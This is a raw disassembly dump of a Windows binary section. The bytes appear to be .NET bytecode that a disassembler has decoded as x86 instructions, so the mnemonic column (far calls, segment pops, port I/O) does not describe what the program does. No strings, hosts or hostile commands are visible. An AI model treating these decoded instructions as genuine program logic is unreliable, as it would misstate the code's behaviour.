  40418d:	26 00 28             	add    %ch,%es:(%eax)
  404190:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  404195:	79 03                	jns    0x40419a
  404197:	00 00                	add    %al,(%eax)
  404199:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40419f:	00 00                	add    %al,(%eax)
  4041a1:	00 00                	add    %al,(%eax)
  4041a3:	72 65                	jb     0x40420a
  4041a5:	09 00                	or     %eax,(%eax)
  4041a7:	70 28                	jo     0x4041d1
  4041a9:	39 00                	cmp    %eax,(%eax)
  4041ab:	00 06                	add    %al,(%esi)
  4041ad:	26 28 72 00          	sub    %dh,%es:0x0(%edx)
  4041b1:	00 0a                	add    %cl,(%edx)
  4041b3:	72 41                	jb     0x4041f6
  4041b5:	0a 00                	or     (%eax),%al
  4041b7:	70 28                	jo     0x4041e1
  4041b9:	4a                   	dec    %edx
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	0a 13                	or     (%ebx),%dl
  4041be:	05 00 72 41 09       	add    $0x9417200,%eax
  4041c3:	00 70 7e             	add    %dh,0x7e(%eax)
  4041c6:	24 00                	and    $0x0,%al
  4041c8:	00 04 72             	add    %al,(%edx,%esi,2)
  4041cb:	4b                   	dec    %ebx
  4041cc:	0a 00                	or     (%eax),%al
  4041ce:	70 11                	jo     0x4041e1
  4041d0:	05 73 25 00 00       	add    $0x2573,%eax
  4041d5:	0a 6f 30             	or     0x30(%edi),%ch
  4041d8:	00 00                	add    %al,(%eax)
  4041da:	0a 28                	or     (%eax),%ch
  4041dc:	6c                   	insb   (%dx),%es:(%edi)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	0a 28                	or     (%eax),%ch
  4041e1:	39 00                	cmp    %eax,(%eax)
  4041e3:	00 06                	add    %al,(%esi)
  4041e5:	26 20 d0             	es and %dl,%al
  4041e8:	07                   	pop    %es
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	28 36                	sub    %dh,(%esi)
  4041ed:	00 00                	add    %al,(%eax)
  4041ef:	0a 00                	or     (%eax),%al
  4041f1:	11 05 08 28 60 00    	adc    %eax,0x602808
  4041f7:	00 0a                	add    %cl,(%edx)
  4041f9:	00 11                	add    %dl,(%ecx)
  4041fb:	05 72 65 0a 00       	add    $0xa6572,%eax
  404200:	70 28                	jo     0x40422a
  404202:	92                   	xchg   %eax,%edx
  404203:	00 00                	add    %al,(%eax)
  404205:	0a 26                	or     (%esi),%ah
  404207:	de 48 25             	fimuls 0x25(%eax)
  40420a:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40420d:	00 0a                	add    %cl,(%edx)
  40420f:	13 34 00             	adc    (%eax,%eax,1),%esi
  404212:	11 34 28             	adc    %esi,(%eax,%ebp,1)
  404215:	2c 00                	sub    $0x0,%al
  404217:	00 0a                	add    %cl,(%edx)
  404219:	00 11                	add    %dl,(%ecx)
  40421b:	34 13                	xor    $0x13,%al
  40421d:	35 72 41 09 00       	xor    $0x94172,%eax
  404222:	70 7e                	jo     0x4042a2
  404224:	24 00                	and    $0x0,%al
  404226:	00 04 72             	add    %al,(%edx,%esi,2)
  404229:	6b 0a 00             	imul   $0x0,(%edx),%ecx
  40422c:	70 11                	jo     0x40423f
  40422e:	35 6f 73 00 00       	xor    $0x736f,%eax
  404233:	0a 28                	or     (%eax),%ch
  404235:	6c                   	insb   (%dx),%es:(%edi)
  404236:	00 00                	add    %al,(%eax)
  404238:	0a 28                	or     (%eax),%ch
  40423a:	39 00                	cmp    %eax,(%eax)
  40423c:	00 06                	add    %al,(%esi)
  40423e:	26 00 28             	add    %ch,%es:(%eax)
  404241:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  404246:	c8 02 00 00          	enter  $0x2,$0x0
  40424a:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404250:	00 00                	add    %al,(%eax)
  404252:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  404255:	00 06                	add    %al,(%esi)
  404257:	00 00                	add    %al,(%eax)
  404259:	dd b4 02 00 00 00 00 	fnsave 0x0(%edx,%eax,1)
  404260:	11 07                	adc    %eax,(%edi)
  404262:	72 87                	jb     0x4041eb
  404264:	0a 00                	or     (%eax),%al
  404266:	70 16                	jo     0x40427e
  404268:	28 32                	sub    %dh,(%edx)
  40426a:	00 00                	add    %al,(%eax)
  40426c:	0a 16                	or     (%esi),%dl
  40426e:	fe 01                	incb   (%ecx)
  404270:	13 50 11             	adc    0x11(%eax),%edx
  404273:	50                   	push   %eax
  404274:	39 ec                	cmp    %ebp,%esp
  404276:	00 00                	add    %al,(%eax)
  404278:	00 7e 1e             	add    %bh,0x1e(%esi)
  40427b:	00 00                	add    %al,(%eax)
  40427d:	04 14                	add    $0x14,%al
  40427f:	fe 01                	incb   (%ecx)
  404281:	13 4f 11             	adc    0x11(%edi),%ecx
  404284:	4f                   	dec    %edi
  404285:	2c 64                	sub    $0x64,%al
  404287:	72 8d                	jb     0x404216
  404289:	0a 00                	or     (%eax),%al
  40428b:	70 28                	jo     0x4042b5
  40428d:	39 00                	cmp    %eax,(%eax)
  40428f:	00 06                	add    %al,(%esi)
  404291:	26 16                	es push %ss
  404293:	13 38                	adc    (%eax),%edi
  404295:	2b 12                	sub    (%edx),%edx
  404297:	11 38                	adc    %edi,(%eax)
  404299:	17                   	pop    %ss
  40429a:	d6                   	salc
  40429b:	13 38                	adc    (%eax),%edi
  40429d:	20 e8                	and    %ch,%al
  40429f:	03 00                	add    (%eax),%eax
  4042a1:	00 28                	add    %ch,(%eax)
  4042a3:	36 00 00             	add    %al,%ss:(%eax)
  4042a6:	0a 00                	or     (%eax),%al
  4042a8:	00 7e 1e             	add    %bh,0x1e(%esi)
  4042ab:	00 00                	add    %al,(%eax)
  4042ad:	04 14                	add    $0x14,%al
  4042af:	fe 01                	incb   (%ecx)
  4042b1:	16                   	push   %ss
  4042b2:	fe 01                	incb   (%ecx)
  4042b4:	11 38                	adc    %edi,(%eax)
  4042b6:	1f                   	pop    %ds
  4042b7:	14 fe                	adc    $0xfe,%al
  4042b9:	01 60 7e             	add    %esp,0x7e(%eax)
  4042bc:	0d 00 00 04 16       	or     $0x16040000,%eax
  4042c1:	fe 01                	incb   (%ecx)
  4042c3:	60                   	pusha
  4042c4:	16                   	push   %ss
  4042c5:	fe 01                	incb   (%ecx)
  4042c7:	13 50 11             	adc    0x11(%eax),%edx
  4042ca:	50                   	push   %eax
  4042cb:	2d ca 7e 1e 00       	sub    $0x1e7eca,%eax
  4042d0:	00 04 14             	add    %al,(%esp,%edx,1)
  4042d3:	fe 01                	incb   (%ecx)
  4042d5:	7e 0d                	jle    0x4042e4
  4042d7:	00 00                	add    %al,(%eax)
  4042d9:	04 16                	add    $0x16,%al
  4042db:	fe 01                	incb   (%ecx)
  4042dd:	60                   	pusha
  4042de:	13 50 11             	adc    0x11(%eax),%edx
  4042e1:	50                   	push   %eax
  4042e2:	2c 06                	sub    $0x6,%al
  4042e4:	00 dd                	add    %bl,%ch
  4042e6:	28 02                	sub    %al,(%edx)
  4042e8:	00 00                	add    %al,(%eax)
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	17                   	pop    %ss
  4042ed:	8d 0a                	lea    (%edx),%ecx
  4042ef:	00 00                	add    %al,(%eax)
  4042f1:	01 13                	add    %edx,(%ebx)
  4042f3:	44                   	inc    %esp
  4042f4:	11 44 16 02          	adc    %eax,0x2(%esi,%edx,1)
  4042f8:	a2 00 11 44 13       	mov    %al,0x13441100
  4042fd:	36 17                	ss pop %ss
  4042ff:	8d 42 00             	lea    0x0(%edx),%eax
  404302:	00 01                	add    %al,(%ecx)
  404304:	13 45 11             	adc    0x11(%ebp),%eax
  404307:	45                   	inc    %ebp
  404308:	16                   	push   %ss
  404309:	17                   	pop    %ss
  40430a:	9c                   	pushf
  40430b:	11 45 13             	adc    %eax,0x13(%ebp)
  40430e:	37                   	aaa
  40430f:	7e 1e                	jle    0x40432f
  404311:	00 00                	add    %al,(%eax)
  404313:	04 28                	add    $0x28,%al
  404315:	0c 00                	or     $0x0,%al
  404317:	00 0a                	add    %cl,(%edx)
  404319:	14 72                	adc    $0x72,%al
  40431b:	95                   	xchg   %eax,%ebp
  40431c:	0a 00                	or     (%eax),%al
  40431e:	70 11                	jo     0x404331
  404320:	36 14 14             	ss adc $0x14,%al
  404323:	11 37                	adc    %esi,(%edi)
  404325:	17                   	pop    %ss
  404326:	28 41 00             	sub    %al,0x0(%ecx)
  404329:	00 0a                	add    %cl,(%edx)
  40432b:	26 11 37             	adc    %esi,%es:(%edi)
  40432e:	16                   	push   %ss
  40432f:	90                   	nop
  404330:	13 50 11             	adc    0x11(%eax),%edx
  404333:	50                   	push   %eax
  404334:	2c 29                	sub    $0x29,%al
  404336:	11 36                	adc    %esi,(%esi)
  404338:	16                   	push   %ss
  404339:	9a 28 0c 00 00 0a 28 	lcall  $0x280a,$0xc28
  404340:	0c 00                	or     $0x0,%al
  404342:	00 0a                	add    %cl,(%edx)
  404344:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  404347:	00 0a                	add    %cl,(%edx)
  404349:	d0 08                	rorb   $1,(%eax)
  40434b:	00 00                	add    %al,(%eax)
  40434d:	1b 28                	sbb    (%eax),%ebp
  40434f:	0f 00 00             	sldt   (%eax)
  404352:	0a 28                	or     (%eax),%ch
  404354:	59                   	pop    %ecx
  404355:	00 00                	add    %al,(%eax)
  404357:	0a 74 08 00          	or     0x0(%eax,%ecx,1),%dh
  40435b:	00 1b                	add    %bl,(%ebx)
  40435d:	10 00                	adc    %al,(%eax)
  40435f:	00 38                	add    %bh,(%eax)
  404361:	f3 00 00             	repz add %al,(%eax)
  404364:	00 11                	add    %dl,(%ecx)
  404366:	07                   	pop    %es
  404367:	72 8d                	jb     0x4042f6
  404369:	0a 00                	or     (%eax),%al
  40436b:	70 16                	jo     0x404383
  40436d:	28 32                	sub    %dh,(%edx)
  40436f:	00 00                	add    %al,(%eax)
  404371:	0a 16                	or     (%esi),%dl
  404373:	fe 01                	incb   (%ecx)
  404375:	13 50 11             	adc    0x11(%eax),%edx
  404378:	50                   	push   %eax
  404379:	39 da                	cmp    %ebx,%edx
  40437b:	00 00                	add    %al,(%eax)
  40437d:	00 73 26             	add    %dh,0x26(%ebx)
  404380:	00 00                	add    %al,(%eax)
  404382:	0a 13                	or     (%ebx),%dl
  404384:	3a 06                	cmp    (%esi),%al
  404386:	16                   	push   %ss
  404387:	9a 7e 24 00 00 04 28 	lcall  $0x2804,$0x247e
  40438e:	4a                   	dec    %edx
  40438f:	00 00                	add    %al,(%eax)
  404391:	0a 6f 2b             	or     0x2b(%edi),%ch
  404394:	00 00                	add    %al,(%eax)
  404396:	0a 13                	or     (%ebx),%dl
  404398:	39 11                	cmp    %edx,(%ecx)
  40439a:	3a 02                	cmp    (%edx),%al
  40439c:	11 39                	adc    %edi,(%ecx)
  40439e:	02 8e b7 11 39 da    	add    -0x25c6ee49(%esi),%cl
  4043a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	00 00                	add    %al,(%eax)
  4043a8:	0a 00                	or     (%eax),%al
  4043aa:	11 3a                	adc    %edi,(%edx)
  4043ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ad:	70 00                	jo     0x4043af
  4043af:	00 0a                	add    %cl,(%edx)
  4043b1:	28 3d 00 00 06 72    	sub    %bh,0x72060000
  4043b7:	d5 09                	aad    $0x9
  4043b9:	00 70 28             	add    %dh,0x28(%eax)
  4043bc:	35 00 00 06 28       	xor    $0x28060000,%eax
  4043c1:	0c 00                	or     $0x0,%al
  4043c3:	00 0a                	add    %cl,(%edx)
  4043c5:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4043c8:	00 0a                	add    %cl,(%edx)
  4043ca:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4043cd:	00 0a                	add    %cl,(%edx)
  4043cf:	80 1e 00             	sbbb   $0x0,(%esi)
  4043d2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4043d5:	1e                   	push   %ds
  4043d6:	00 00                	add    %al,(%eax)
  4043d8:	04 28                	add    $0x28,%al
  4043da:	0c 00                	or     $0x0,%al
  4043dc:	00 0a                	add    %cl,(%edx)
  4043de:	14 72                	adc    $0x72,%al
  4043e0:	9d                   	popf
  4043e1:	0a 00                	or     (%eax),%al
  4043e3:	70 17                	jo     0x4043fc
  4043e5:	8d 0a                	lea    (%edx),%ecx
  4043e7:	00 00                	add    %al,(%eax)
  4043e9:	01 13                	add    %edx,(%ebx)
  4043eb:	44                   	inc    %esp
  4043ec:	11 44 16 7e          	adc    %eax,0x7e(%esi,%edx,1)
  4043f0:	12 00                	adc    (%eax),%al
  4043f2:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4043f5:	00 11                	add    %dl,(%ecx)
  4043f7:	44                   	inc    %esp
  4043f8:	14 14                	adc    $0x14,%al
  4043fa:	28 75 00             	sub    %dh,0x0(%ebp)
  4043fd:	00 0a                	add    %cl,(%edx)
  4043ff:	00 7e 1e             	add    %bh,0x1e(%esi)
  404402:	00 00                	add    %al,(%eax)
  404404:	04 28                	add    $0x28,%al
  404406:	0c 00                	or     $0x0,%al
  404408:	00 0a                	add    %cl,(%edx)
  40440a:	14 72                	adc    $0x72,%al
  40440c:	a1 0a 00 70 17       	mov    0x1770000a,%eax
  404411:	8d 0a                	lea    (%edx),%ecx
  404413:	00 00                	add    %al,(%eax)
  404415:	01 13                	add    %edx,(%ebx)
  404417:	44                   	inc    %esp
  404418:	11 44 16 7e          	adc    %eax,0x7e(%esi,%edx,1)
  40441c:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  404421:	00 11                	add    %dl,(%ecx)
  404423:	44                   	inc    %esp
  404424:	14 14                	adc    $0x14,%al
  404426:	28 75 00             	sub    %dh,0x0(%ebp)
  404429:	00 0a                	add    %cl,(%edx)
  40442b:	00 7e 1e             	add    %bh,0x1e(%esi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	04 28                	add    $0x28,%al
  404432:	0c 00                	or     $0x0,%al
  404434:	00 0a                	add    %cl,(%edx)
  404436:	14 72                	adc    $0x72,%al
  404438:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404439:	0a 00                	or     (%eax),%al
  40443b:	70 17                	jo     0x404454
  40443d:	8d 0a                	lea    (%edx),%ecx
  40443f:	00 00                	add    %al,(%eax)
  404441:	01 13                	add    %edx,(%ebx)
  404443:	44                   	inc    %esp
  404444:	11 44 16 7e          	adc    %eax,0x7e(%esi,%edx,1)
  404448:	0c 00                	or     $0x0,%al
  40444a:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40444d:	00 11                	add    %dl,(%ecx)
  40444f:	44                   	inc    %esp
  404450:	14 14                	adc    $0x14,%al
  404452:	28 75 00             	sub    %dh,0x0(%ebp)
  404455:	00 0a                	add    %cl,(%edx)
  404457:	00 00                	add    %al,(%eax)
  404459:	dd b3 00 00 00 25    	fnsave 0x25000000(%ebx)
  40445f:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404462:	00 0a                	add    %cl,(%edx)
  404464:	13 3b                	adc    (%ebx),%edi
  404466:	00 11                	add    %dl,(%ecx)
  404468:	3b 28                	cmp    (%eax),%ebp
  40446a:	2c 00                	sub    $0x0,%al
  40446c:	00 0a                	add    %cl,(%edx)
  40446e:	00 11                	add    %dl,(%ecx)
  404470:	3b 13                	cmp    (%ebx),%edx
  404472:	3c 06                	cmp    $0x6,%al
  404474:	8e b7 16 31 25 06    	mov    0x6253116(%edi),%?
  40447a:	16                   	push   %ss
  40447b:	9a 72 87 0a 00 70 16 	lcall  $0x1670,$0xa8772
  404482:	28 32                	sub    %dh,(%edx)
  404484:	00 00                	add    %al,(%eax)
  404486:	0a 16                	or     (%esi),%dl
  404488:	fe 01                	incb   (%ecx)
  40448a:	06                   	push   %es
  40448b:	16                   	push   %ss
  40448c:	9a 72 8d 0a 00 70 16 	lcall  $0x1670,$0xa8d72
  404493:	28 32                	sub    %dh,(%edx)
  404495:	00 00                	add    %al,(%eax)
  404497:	0a 16                	or     (%esi),%dl
  404499:	fe 01                	incb   (%ecx)
  40449b:	60                   	pusha
  40449c:	2d 03 16 2b 01       	sub    $0x12b1603,%eax
  4044a1:	17                   	pop    %ss
  4044a2:	13 50 11             	adc    0x11(%eax),%edx
  4044a5:	50                   	push   %eax
  4044a6:	2c 06                	sub    $0x6,%al
  4044a8:	14 80                	adc    $0x80,%al
  4044aa:	1e                   	push   %ds
  4044ab:	00 00                	add    %al,(%eax)
  4044ad:	04 00                	add    $0x0,%al
  4044af:	00 1b                	add    %bl,(%ebx)
  4044b1:	8d 23                	lea    (%ebx),%esp
  4044b3:	00 00                	add    %al,(%eax)
  4044b5:	01 13                	add    %edx,(%ebx)
  4044b7:	41                   	inc    %ecx
  4044b8:	11 41 16             	adc    %eax,0x16(%ecx)
  4044bb:	72 a9                	jb     0x404466
  4044bd:	0a 00                	or     (%eax),%al
  4044bf:	70 a2                	jo     0x404463
  4044c1:	00 11                	add    %dl,(%ecx)
  4044c3:	41                   	inc    %ecx
  4044c4:	17                   	pop    %ss
  4044c5:	7e 24                	jle    0x4044eb
  4044c7:	00 00                	add    %al,(%eax)
  4044c9:	04 a2                	add    $0xa2,%al
  4044cb:	00 11                	add    %dl,(%ecx)
  4044cd:	41                   	inc    %ecx
  4044ce:	18 06                	sbb    %al,(%esi)
  4044d0:	16                   	push   %ss
  4044d1:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  4044d8:	24 00                	and    $0x0,%al
  4044da:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4044dd:	00 11                	add    %dl,(%ecx)
  4044df:	41                   	inc    %ecx
  4044e0:	1a 11                	sbb    (%ecx),%dl
  4044e2:	3c 6f                	cmp    $0x6f,%al
  4044e4:	73 00                	jae    0x4044e6
  4044e6:	00 0a                	add    %cl,(%edx)
  4044e8:	a2 00 11 41 28       	mov    %al,0x28411100
  4044ed:	44                   	inc    %esp
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 28                	or     (%eax),%ch
  4044f2:	39 00                	cmp    %eax,(%eax)
  4044f4:	00 06                	add    %al,(%esi)
  4044f6:	26 de 10             	ficoms %es:(%eax)
  4044f9:	25 28 2c 00 00       	and    $0x2c28,%eax
  4044fe:	0a 13                	or     (%ebx),%dl
  404500:	3d 00 28 2d 00       	cmp    $0x2d2800,%eax
  404505:	00 0a                	add    %cl,(%edx)
  404507:	de 00                	fiadds (%eax)
  404509:	00 28                	add    %ch,(%eax)
  40450b:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  404510:	00 00                	add    %al,(%eax)
  404512:	00 2a                	add    %ch,(%edx)
  404514:	41                   	inc    %ecx
  404515:	54                   	push   %esp
  404516:	01 00                	add    %eax,(%eax)
  404518:	00 00                	add    %al,(%eax)
  40451a:	00 00                	add    %al,(%eax)
  40451c:	63 08                	arpl   %ecx,(%eax)
  40451e:	00 00                	add    %al,(%eax)
  404520:	4b                   	dec    %ebx
  404521:	00 00                	add    %al,(%eax)
  404523:	00 ae 08 00 00 10    	add    %ch,0x10000008(%esi)
  404529:	00 00                	add    %al,(%eax)
  40452b:	00 20                	add    %ah,(%eax)
  40452d:	00 00                	add    %al,(%eax)
  40452f:	01 00                	add    %eax,(%eax)
  404531:	00 00                	add    %al,(%eax)
  404533:	00 4f 08             	add    %cl,0x8(%edi)
  404536:	00 00                	add    %al,(%eax)
  404538:	7a 00                	jp     0x40453a
  40453a:	00 00                	add    %al,(%eax)
  40453c:	c9                   	leave
  40453d:	08 00                	or     %al,(%eax)
  40453f:	00 10                	add    %dl,(%eax)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 20                	add    %ah,(%eax)
  404545:	00 00                	add    %al,(%eax)
  404547:	01 00                	add    %eax,(%eax)
  404549:	00 00                	add    %al,(%eax)
  40454b:	00 e3                	add    %ah,%bl
  40454d:	09 00                	or     %eax,(%eax)
  40454f:	00 20                	add    %ah,(%eax)
  404551:	00 00                	add    %al,(%eax)
  404553:	00 03                	add    %al,(%ebx)
  404555:	0a 00                	or     (%eax),%al
  404557:	00 10                	add    %dl,(%eax)
  404559:	00 00                	add    %al,(%eax)
  40455b:	00 20                	add    %ah,(%eax)
  40455d:	00 00                	add    %al,(%eax)
  40455f:	01 00                	add    %eax,(%eax)
  404561:	00 00                	add    %al,(%eax)
  404563:	00 bb 09 00 00 5b    	add    %bh,0x5b000009(%ebx)
  404569:	00 00                	add    %al,(%eax)
  40456b:	00 16                	add    %dl,(%esi)
  40456d:	0a 00                	or     (%eax),%al
  40456f:	00 10                	add    %dl,(%eax)
  404571:	00 00                	add    %al,(%eax)
  404573:	00 20                	add    %ah,(%eax)
  404575:	00 00                	add    %al,(%eax)
  404577:	01 00                	add    %eax,(%eax)
  404579:	00 00                	add    %al,(%eax)
  40457b:	00 2a                	add    %ch,(%edx)
  40457d:	0a 00                	or     (%eax),%al
  40457f:	00 3d 00 00 00 67    	add    %bh,0x67000000
  404585:	0a 00                	or     (%eax),%al
  404587:	00 10                	add    %dl,(%eax)
  404589:	00 00                	add    %al,(%eax)
  40458b:	00 20                	add    %ah,(%eax)
  40458d:	00 00                	add    %al,(%eax)
  40458f:	01 00                	add    %eax,(%eax)
  404591:	00 00                	add    %al,(%eax)
  404593:	00 0e                	add    %cl,(%esi)
  404595:	0c 00                	or     $0x0,%al
  404597:	00 49 00             	add    %cl,0x0(%ecx)
  40459a:	00 00                	add    %al,(%eax)
  40459c:	57                   	push   %edi
  40459d:	0c 00                	or     $0x0,%al
  40459f:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4045a3:	00 20                	add    %ah,(%eax)
  4045a5:	00 00                	add    %al,(%eax)
  4045a7:	01 00                	add    %eax,(%eax)
  4045a9:	00 00                	add    %al,(%eax)
  4045ab:	00 a4 0c 00 00 0c 00 	add    %ah,0xc0000(%esp,%ecx,1)
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	b0 0c                	mov    $0xc,%al
  4045b6:	00 00                	add    %al,(%eax)
  4045b8:	44                   	inc    %esp
  4045b9:	00 00                	add    %al,(%eax)
  4045bb:	00 20                	add    %ah,(%eax)
  4045bd:	00 00                	add    %al,(%eax)
  4045bf:	01 00                	add    %eax,(%eax)
  4045c1:	00 00                	add    %al,(%eax)
  4045c3:	00 17                	add    %dl,(%edi)
  4045c5:	0d 00 00 3f 00       	or     $0x3f0000,%eax
  4045ca:	00 00                	add    %al,(%eax)
  4045cc:	56                   	push   %esi
  4045cd:	0d 00 00 40 00       	or     $0x400000,%eax
  4045d2:	00 00                	add    %al,(%eax)
  4045d4:	20 00                	and    %al,(%eax)
  4045d6:	00 01                	add    %al,(%ecx)
  4045d8:	00 00                	add    %al,(%eax)
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	a8 12                	test   $0x12,%al
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	2c 00                	sub    $0x0,%al
  4045e2:	00 00                	add    %al,(%eax)
  4045e4:	d4 12                	aam    $0x12
  4045e6:	00 00                	add    %al,(%eax)
  4045e8:	10 00                	adc    %al,(%eax)
  4045ea:	00 00                	add    %al,(%eax)
  4045ec:	20 00                	and    %al,(%eax)
  4045ee:	00 01                	add    %al,(%ecx)
  4045f0:	00 00                	add    %al,(%eax)
  4045f2:	00 00                	add    %al,(%eax)
  4045f4:	e4 14                	in     $0x14,%al
  4045f6:	00 00                	add    %al,(%eax)
  4045f8:	41                   	inc    %ecx
  4045f9:	00 00                	add    %al,(%eax)
  4045fb:	00 25 15 00 00 40    	add    %ah,0x40000015
  404601:	00 00                	add    %al,(%eax)
  404603:	00 20                	add    %ah,(%eax)
  404605:	00 00                	add    %al,(%eax)
  404607:	01 00                	add    %eax,(%eax)
  404609:	00 00                	add    %al,(%eax)
  40460b:	00 6f 15             	add    %ch,0x15(%edi)
  40460e:	00 00                	add    %al,(%eax)
  404610:	0d 00 00 00 7c       	or     $0x7c000000,%eax
  404615:	15 00 00 40 00       	adc    $0x400000,%eax
  40461a:	00 00                	add    %al,(%eax)
  40461c:	20 00                	and    %al,(%eax)
  40461e:	00 01                	add    %al,(%ecx)
  404620:	00 00                	add    %al,(%eax)
  404622:	00 00                	add    %al,(%eax)
  404624:	dc 15 00 00 49 00    	fcoml  0x490000
  40462a:	00 00                	add    %al,(%eax)
  40462c:	25 16 00 00 48       	and    $0x48000016,%eax
  404631:	00 00                	add    %al,(%eax)
  404633:	00 20                	add    %ah,(%eax)
  404635:	00 00                	add    %al,(%eax)
  404637:	01 00                	add    %eax,(%eax)
  404639:	00 00                	add    %al,(%eax)
  40463b:	00 cc                	add    %cl,%ah
  40463d:	18 00                	sbb    %al,(%eax)
  40463f:	00 49 00             	add    %cl,0x0(%ecx)
  404642:	00 00                	add    %al,(%eax)
  404644:	15 19 00 00 10       	adc    $0x10000019,%eax
  404649:	00 00                	add    %al,(%eax)
  40464b:	00 20                	add    %ah,(%eax)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	01 00                	add    %eax,(%eax)
  404651:	00 00                	add    %al,(%eax)
  404653:	00 16                	add    %dl,(%esi)
  404655:	00 00                	add    %al,(%eax)
  404657:	00 64 18 00          	add    %ah,0x0(%eax,%ebx,1)
  40465b:	00 7a 18             	add    %bh,0x18(%edx)
  40465e:	00 00                	add    %al,(%eax)
  404660:	b3 00                	mov    $0x0,%bl
  404662:	00 00                	add    %al,(%eax)
  404664:	20 00                	and    %al,(%eax)
  404666:	00 01                	add    %al,(%ecx)
  404668:	1b 30                	sbb    (%eax),%esi
  40466a:	04 00                	add    $0x0,%al
  40466c:	1a 04 00             	sbb    (%eax,%eax,1),%al
  40466f:	00 17                	add    %dl,(%edi)
  404671:	00 00                	add    %al,(%eax)
  404673:	11 00                	adc    %eax,(%eax)
  404675:	72 5f                	jb     0x4046d6
  404677:	08 00                	or     %al,(%eax)
  404679:	70 7e                	jo     0x4046f9
  40467b:	24 00                	and    $0x0,%al
  40467d:	00 04 28             	add    %al,(%eax,%ebp,1)
  404680:	4a                   	dec    %edx
  404681:	00 00                	add    %al,(%eax)
  404683:	0a 0b                	or     (%ebx),%cl
  404685:	00 72 85             	add    %dh,-0x7b(%edx)
  404688:	01 00                	add    %eax,(%eax)
  40468a:	70 72                	jo     0x4046fe
  40468c:	69 00 00 70 28 25    	imul   $0x25287000,(%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	06                   	push   %es
  404695:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  404698:	00 0a                	add    %cl,(%edx)
  40469a:	72 69                	jb     0x404705
  40469c:	00 00                	add    %al,(%eax)
  40469e:	70 16                	jo     0x4046b6
  4046a0:	28 42 00             	sub    %al,0x0(%edx)
  4046a3:	00 0a                	add    %cl,(%edx)
  4046a5:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4046a8:	14 2c                	adc    $0x2c,%al
  4046aa:	30 07                	xor    %al,(%edi)
  4046ac:	7f 22                	jg     0x4046d0
  4046ae:	00 00                	add    %al,(%eax)
  4046b0:	04 28                	add    $0x28,%al
  4046b2:	21 00                	and    %eax,(%eax)
  4046b4:	00 06                	add    %al,(%esi)
  4046b6:	72 af                	jb     0x404667
  4046b8:	0a 00                	or     (%eax),%al
  4046ba:	70 28                	jo     0x4046e4
  4046bc:	26 00 00             	add    %al,%es:(%eax)
  4046bf:	06                   	push   %es
  4046c0:	28 43 00             	sub    %al,0x0(%ebx)
  4046c3:	00 0a                	add    %cl,(%edx)
  4046c5:	13 0d 12 0d 28 24    	adc    0x24280d12,%ecx
  4046cb:	00 00                	add    %al,(%eax)
  4046cd:	06                   	push   %es
  4046ce:	7e 24                	jle    0x4046f4
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	04 28                	add    $0x28,%al
  4046d4:	43                   	inc    %ebx
  4046d5:	00 00                	add    %al,(%eax)
  4046d7:	0a 0b                	or     (%ebx),%cl
  4046d9:	2b 47 00             	sub    0x0(%edi),%eax
  4046dc:	07                   	pop    %es
  4046dd:	72 85                	jb     0x404664
  4046df:	01 00                	add    %eax,(%eax)
  4046e1:	70 72                	jo     0x404755
  4046e3:	69 00 00 70 28 25    	imul   $0x25287000,(%eax),%eax
  4046e9:	00 00                	add    %al,(%eax)
  4046eb:	06                   	push   %es
  4046ec:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4046ef:	00 0a                	add    %cl,(%edx)
  4046f1:	28 22                	sub    %ah,(%edx)
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 13                	or     (%ebx),%dl
  4046f7:	0d 12 0d 28 21       	or     $0x21280d12,%eax
  4046fc:	00 00                	add    %al,(%eax)
  4046fe:	06                   	push   %es
  4046ff:	72 af                	jb     0x4046b0
  404701:	0a 00                	or     (%eax),%al
  404703:	70 28                	jo     0x40472d
  404705:	26 00 00             	add    %al,%es:(%eax)
  404708:	06                   	push   %es
  404709:	28 43 00             	sub    %al,0x0(%ebx)
  40470c:	00 0a                	add    %cl,(%edx)
  40470e:	13 0e                	adc    (%esi),%ecx
  404710:	12 0e                	adc    (%esi),%cl
  404712:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404715:	00 06                	add    %al,(%esi)
  404717:	7e 24                	jle    0x40473d
  404719:	00 00                	add    %al,(%eax)
  40471b:	04 28                	add    $0x28,%al
  40471d:	43                   	inc    %ebx
  40471e:	00 00                	add    %al,(%eax)
  404720:	0a 0b                	or     (%ebx),%cl
  404722:	00 de                	add    %bl,%dh
  404724:	29 25 28 2c 00 00    	sub    %esp,0x2c28
  40472a:	0a 0d 00 07 28 26    	or     0x26280700,%cl
